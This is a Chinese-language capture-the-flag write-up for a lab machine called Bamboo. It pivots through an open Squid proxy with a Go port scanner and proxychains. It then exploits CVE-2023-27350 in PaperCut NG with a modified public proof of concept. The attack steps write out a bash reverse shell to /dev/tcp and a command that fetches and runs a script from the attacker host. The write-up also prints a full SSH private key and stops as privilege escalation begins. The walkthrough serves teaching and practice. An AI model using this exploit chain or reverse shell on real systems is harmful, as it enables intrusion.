## Bamboo
```
[★]$ nmap -sC -sV 10.129.238.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 23:54 CST
Nmap scan report for 10.129.238.16
Host is up (0.0090s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)
|_  256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)
3128/tcp open  http-proxy Squid http proxy 5.9
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/5.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#### 既然 3128 端口已开放，该端口通常用于代理服务器，尤其是 Squid 代理，那么配置错误的实例就可以用于转向内部服务。我们可以按照 HackTricks 上的指南来枚举通过 Squid 代理可访问的服务。还有一个工具我们可以使用。首先，我们下载 squidscan 仓库文件，包括 go.mod 和 squidscan.go。然后，我们编辑 squidscan.go，将 proxyURL 设置为代理服务器的 IP 和端口。
#### [1]端口工具 
https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html
#### Squid是一款缓存转发型 HTTP Web 代理。它用途广泛，包括通过缓存重复请求来加速 Web 服务器，为共享网络资源的群体缓存 Web、DNS 和其他计算机网络查询，以及通过过滤流量来增强安全性。虽然 Squid 主要用于 HTTP 和 FTP，但也对其他一些协议（例如 Internet Gopher、SSL、TLS 和 HTTPS）提供有限的支持。与 Privoxy 不同，Squid 本身不支持 SOCKS 协议，但可以通过与 Privoxy 配合使用来提供 SOCKS 支持。
#### [2]Squidscan
https://gist.github.com/xct/597d48456214b15108b2817660fdee00
```
[★]$ cat go.mod
module squidscan

go 1.16

require github.com/cheggaaa/pb/v3 v3.1.2
```
```
[★]$ cat squidscan.go
package main

import (
	"fmt"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"
	"strings"
	"io/ioutil"
	"github.com/cheggaaa/pb/v3"
)

var (
		proxyURL = "http://10.129.238.16:3128" // adjust proxy ip & port 
	numWorkers = 100  // adjust workers
	numPorts = 65535 // adjust ports
)

func main() {
	proxyURL, err := url.Parse(proxyURL)
	if err != nil {
		fmt.Printf("Failed to parse proxy URL: %v\n", err)
		return
	}
	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 3 * time.Second,
		}).DialContext,
	}
	client := &http.Client{Transport: transport}
	openPorts := make([]int, 0)

	bar := pb.StartNew(numPorts)
	sem := make(chan struct{}, numWorkers)
	var wg sync.WaitGroup
	for port := 1; port <= numPorts; port++ {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			sem <- struct{}{} 
			defer func() {
				<-sem 
				bar.Increment()
			}()

			address := fmt.Sprintf("127.0.0.1:%d", p)
			r, err := client.Get(fmt.Sprintf("http://%s", address))
			if err != nil {
				return
			}
			data, _ := ioutil.ReadAll(r.Body)
			dataStr := string(data)
			if strings.Contains(dataStr,"The requested URL could not be retrieved"){
				return;
			} 
			defer r.Body.Close()
			openPorts = append(openPorts, p)
			fmt.Printf("Port %d found!\n", p)

		}(port)
	}
	wg.Wait()
	bar.Finish()

	fmt.Println("Open ports:")
	for _, port := range openPorts {
		fmt.Println(port)
	}
}
```
#### 然后我们运行 go.mod tidy 来安装依赖项并构建二进制文件。好玩 
```
[★]$ go mod tidy
go: downloading github.com/cheggaaa/pb/v3 v3.1.2
go: downloading github.com/VividCortex/ewma v1.2.0
go: downloading github.com/fatih/color v1.14.1
go: downloading github.com/mattn/go-colorable v0.1.13
go: downloading github.com/mattn/go-isatty v0.0.17
go: downloading github.com/mattn/go-runewidth v0.0.12
go: downloading golang.org/x/sys v0.5.0
go: downloading github.com/rivo/uniseg v0.2.0
[★]$ go build
[★]$ ls
cacert.der  Downloads  go.sum   Pictures   squidscan.go
Desktop     go         Music    Public     Templates
Documents   go.mod     my_data  squidscan  Videos
```
#### 从输出结果中我们可以看到，squidscan 可执行文件已生成，现在我们可以执行它来启动扫描。
```
[★]$ ./squidscan
Port 22 found!
8927 / 65535 [------>_______________________________________] 13.62% 3173 p/sPort 9173 found!
Port 9174 found!
10368 / 65535 [------->_____________________________________] 15.82% 3173 p/sPort 9192 found!
Port 9195 found!
20291 / 65535 [------------->_______________________________] 30.96% 1494 p/sPort 9191 found!
65534 / 65535 [---------------------------------------------->] 100.00% 0 p/s
65534 / 65535 [---------------------------------------------->] 100.00% 0 p/s
65534 / 65535 [---------------------------------------------->] 100.00% 0 p/s65534 / 65535 [---------------------------------------------->] 100.00% 0 p/s^C

//得到
Port 22 found!
Port 9173 found!
Port 9174 found!
Port 9192 found!
Port 9195 found!
Port 9191 found! //常见于 qBittorrent Web UI
```
#### 我们找到一些开放端口，然后按照“黑客技巧”博客中的说明编辑我们的代理链文件，接着便开始对这些端口进行枚举。
#### 查看 代理配置文件 的最后一行
```
[★]$ echo 'http 10.129.238.16  3128' | sudo tee -a /etc/proxychains4.conf
http 10.129.238.16  3128
[★]$ cat /etc/proxychains4.conf | tail -n1
http 10.129.238.16  3128

//注释掉：#socks4 	127.0.0.1 9050
[★]$ sudo vi /etc/proxychains4.conf
[★]$ cat /etc/proxychains4.conf | tail -n1 -n2 -n3
#socks4 	127.0.0.1 9050

http 10.129.238.16  3128
```
#### 用 curl 测试 HTTP
```
[★]$ proxychains4 curl -v http://10.129.238.16:9191
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
*   Trying 10.129.238.16:9191...
[proxychains] Strict chain  ...  10.129.238.16:3128  ...  10.129.238.16:9191  ...  OK
* Connected to 10.129.238.16 (10.129.238.16) port 9191 (#0)
> GET / HTTP/1.1
> Host: 10.129.238.16:9191
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Sat, 07 Mar 2026 06:41:13 GMT
< Location: http://10.129.238.16:9191/user
< Content-Length: 0
< 
* Connection #0 to host 10.129.238.16 left intact
```
#### 你通过 ProxyChains 使用 Squid 成功访问了目标端口；
#### 你 → Squid代理(3128) → 内网端口9191
#### 从该请求中，我们得知网址为 http://10.129.234.79:9191/user 
#### 服务器返回了 HTTP/1.1 302“已找到”状态，并带有“Location: http://10.129.234.79:9191/user”这一头部信息，该信息指示客户端重定向至该网址
#### 现在，如果我们对 /user 端点运行 curl 命令，就会发现标题确实是“PaperCut”
```
[★]$ proxychains4 curl -v http://10.129.238.16:9191/user
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
*   Trying 10.129.238.16:9191...
[proxychains] Strict chain  ...  10.129.238.16:3128  ...  10.129.238.16:9191  ...  OK
* Connected to 10.129.238.16 (10.129.238.16) port 9191 (#0)
> GET /user HTTP/1.1
> Host: 10.129.238.16:9191
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 07 Mar 2026 06:45:02 GMT
< X-Frame-Options: SAMEORIGIN
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1
< Set-Cookie: JSESSIONID=node0lu1bwtq9ia9sywnx5q3efnx31.node0; Path=/; HttpOnly
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Cache-Control: no-cache
< Cache-Control: no-store
< Pragma: no-cache
< Content-Type: text/html;charset=utf-8
< Vary: Accept-Encoding, User-Agent
< Transfer-Encoding: chunked
< 
<!DOCTYPE HTML>
<!-- Application: app-server -->
<!-- Page: Home -->
<!-- Generated: Sat Mar 07 06:45:02 UTC 2026 -->
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<title>PaperCut Login for Trial License</title>
<link rel="shortcut icon" href="/images/icons3/favicon.ico" type="image/vnd.microsoft.icon"/>
</SNIP>
```
#### 我们正在使用 PaperCut NG 在 9191 端口运行程序。然后我们可以配置 Burp Suite 来使用这个代理。地址。
#### 首先，我们启动 Burp Suite，然后选择“代理设置” -> “网络” -> “连接” -> “上游代理服务器”，接着在相应字段中输入代理服务器的主机名和端口号。
#### $ burpsuite -> Setting -> Network -> Connetctions -> Upstream proxy servers -> add
```
Destination host    *
Proxy host          10.129.238.16
Proxu port          3128
```
#### 要关掉拦截 Proxy → Intercept → Intercept is off ！！！！
#### 在我们的 Burp 浏览器中访问 127.0.0.1:9191/user 页面（同时配置了代理），我们看到了 PaperCut NG 22.0 的登录页面，这是一个打印管理应用程序。
![图片](images/2026030701.png)
### Foothold
```
[★]$ proxychains4 curl -I http://127.0.0.1:9191
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  10.129.238.16:3128  ...  127.0.0.1:9191  ...  OK
HTTP/1.1 302 Found
Date: Sat, 07 Mar 2026 07:31:07 GMT
Location: http://127.0.0.1:9191/user
Content-Length: 0

[★]$ proxychains4 curl -L http://10.129.238.16:9191 | head
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[proxychains] Strict chain  ...  10.129.238.16:3128  ...  10.129.238.16:9191  ...  OK
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
<!DOCTYPE HTML>
<!-- Application: app-server -->
<!-- Page: Home -->
<!-- Generated: Sat Mar 07 07:32:05 UTC 2026 -->
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<title>PaperCut Login for Trial License</title>
<link rel="shortcut icon" href="/images/icons3/favicon.ico" type="image/vnd.microsoft.icon"/>
<meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
100 12392    0 12392    0     0  96593      0 --:--:-- --:--:-- --:--:-- 96593
curl: (23) Failed writing body
```
#### 对 PaperCut NG 22 所存在的漏洞进行快速的谷歌搜索，结果显示存在 CVE-2023-27350 这个漏洞，还有这个 POC 脚本。我们通过在本地启动一个 Python 服务器来处理来自目标设备的 GET 请求来进行测试。
#### 描述 
https://nvd.nist.gov/vuln/detail/cve-2023-27350
#### 此漏洞允许远程攻击者绕过受影响的 PaperCut NG 22.0.5（版本 63914）安装的身份验证。利用此漏洞无需身份验证。具体缺陷存在于 SetupCompleted 类中。该问题源于访问控制不当。攻击者可以利用此漏洞绕过身份验证，并在 SYSTEM 上下文中执行任意代码。漏洞编号为 ZDI-CAN-18987。
https://raw.githubusercontent.com/horizon3ai/CVE-2023-27350/refs/heads/main/CVE-2023-27350.py
```
[★]$ wget https://raw.githubusercontent.com/horizon3ai/CVE-2023-27350/refs/heads/main/CVE-2023-27350.py
```
#### 修改CVE-2023-27350.py  postback = "java.lang.Runtime.getRuntime().exec('{command}');"
```
def execute(base_url, session, command):
    print('[*] Prepparing to execute...')
    postback = "java.lang.Runtime.getRuntime().exec('cmd.exe /C \"for /F \"usebackq delims=\" %A in (`whoami`) do curl http://10.0.40.83:8081/%A\"');"
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    r = session.get(f'{base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False)


//改为
def execute(base_url, session, command):
    print('[*] Prepparing to execute...')
    postback = "java.lang.Runtime.getRuntime().exec('{command}');"
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    r = session.get(f'{base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False)

```
#### 开启侦听
```
[★]$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```
#### payload命令
```
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl  http://10.10.14.27:9000'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
```
#### 再修改CVE-2023.27350.py
```
[★]$ cat CVE-2023-27350.py
#!/usr/bin/python3
import argparse
import requests


def get_session_id(base_url):
    s = requests.Session()
    s.proxies = {
            "http": "http://10.129.238.16:3128",
            "https": "http://10.129.238.16:3128"
            }
    r = s.get(f'{base_url}/app?service=page/SetupCompleted', verify=False)
    
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/SetupCompleted/$Form',
        'sp': 'S0',
        'Form0': '$Hidden,analyticsEnabled,$Submit',
        '$Hidden': 'true',
        '$Submit': 'Login'
    }
```
#### 还差一点点
```
[★]$ python3 CVE-2023-27350.py -u http://127.0.0.1:9191 -c "curl http://10.10.14.27:9000"
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[-] Might not have a printer configured. Exploit manually by adding one.
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y

[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[-] Might not have a printer configured. Exploit manually by adding one.
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```
#### 在burpsuite里面还无法登录，所在的页面是http://127.0.0.1:9191/app
#### 要继续修改CVE-2023-27350.py,把GET改为POST，GET是读取，不会触发操作
```
def execute(base_url, session, command):
    print('[*] Prepparing to execute...')
    postback = "java.lang.Runtime.getRuntime().exec('{command}');"
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterList/selectPrinter',
        'sp': 'l1001'
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
```
#### 系统里没有配置 Printer，所以脚本找不到执行脚本的设备。在 PaperCut NG 里，RCE 是通过 printer script 触发的
```
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```
#### 回顾我们的 HTTP 服务器，我们看到了 GET 请求，这证明该脚本是有效的。
```
[★]$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.129.238.16 - - [07/Mar/2026 02:30:34] "GET / HTTP/1.1" 200 -
```
#### 写反弹
```
[★]$ vi shell.sh
[★]$ cat shell.sh
#!/bin/bash
sh -i >& /dev/tcp/10.10.14.27/5544 0>&1
```
```
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000/shell.sh -o /tmp/shell.sh'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```
```
 [★]$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.129.238.16 - - [07/Mar/2026 02:30:34] "GET / HTTP/1.1" 200 -
10.129.238.16 - - [07/Mar/2026 02:59:49] code 404, message File not found
10.129.238.16 - - [07/Mar/2026 03:00:02] "GET /shell.sh HTTP/1.1" 200 -
```
#### 运行反弹
```
[★]$ nc -lvnp 5544
listening on [any] 5544 ...
```
```
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'bash /tmp/shell.sh'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```
#### 看着我们的听众，我们接收到来自 PaperCut 主机的连接。然后我们使用脚本，该脚本创建了一个伪终端，并使用参数 -c /bin/bash 和 /dev/null 来启动一个新的交互式 bash 命令行，并丢弃输出日志，从而为我们提供一个更稳定的命令行环境。
```
[★]$ nc -lvnp 5544
listening on [any] 5544 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.238.16] 42222
sh: 0: can't access tty; job control turned off
$ script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
papercut@bamboo:~/server$ id
id
uid=1001(papercut) gid=1001(papercut) groups=1001(papercut)
papercut@bamboo:~/server$
papercut@bamboo:~$ cat /home/papercut/user.txt
```
### Privilege Escalation
```
papercut@bamboo:~$ mkdir .ssh
mkdir .ssh
papercut@bamboo:~$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/papercut/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/papercut/.ssh/id_rsa
Your public key has been saved in /home/papercut/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:JAMXPIdEcJvOKiZ14QexhEI7G35GXM/cKt/lp4D2LCE papercut@bamboo
The key's randomart image is:
+---[RSA 3072]----+
|.. .=**o         |
|. +..*Boo        |
| = o+ =*..       |
|. =. = +.        |
| o.oo.+.S  .     |
| .o. Eo.o o      |
|. o . .+.o . .   |
| o .  ..o . o    |
|        .o .     |
+----[SHA256]-----+
papercut@bamboo:~$ cd .ssh
cd .ssh
papercut@bamboo:~/.ssh$ ls -la
ls -la
total 16
drwxr-xr-x 2 papercut papercut 4096 Mar  7 09:11 .
drwxr-xr-x 9 papercut papercut 4096 Mar  7 09:10 ..
-rw------- 1 papercut papercut 2602 Mar  7 09:11 id_rsa
-rw-r--r-- 1 papercut papercut  569 Mar  7 09:11 id_rsa.pub
papercut@bamboo:~/.ssh$
papercut@bamboo:~/.ssh$ cat id_rsa.pub >> authorized_keys
cat id_rsa.pub >> authorized_keys
papercut@bamboo:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```
#### 习惯就
```
[★]$ vi id_rsa
[★]$ chmod 600 id_rsa
```
#### 现在，我们将使用 linpeas 来对系统进行枚举。linpeas 是一个自动化的本地 Linux 枚举脚本，用于查找常见的权限提升途径。
```
[★]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

#### 从输出结果中我们可以看到，linpeas在路径中找到了 /home/papercut/server/bin/linux-x64 。如果一个具有特权权限的进程使用了该路径，并且该目录可被非特权用户写入，那么我们就可以在其中放置一个脚本或二进制文件，当该进程调用一个常见的命令时，该文件可能会被执行，从而可能导致权限提升后的 shell 环境。因此，我们接着检查了该文件夹的权限。
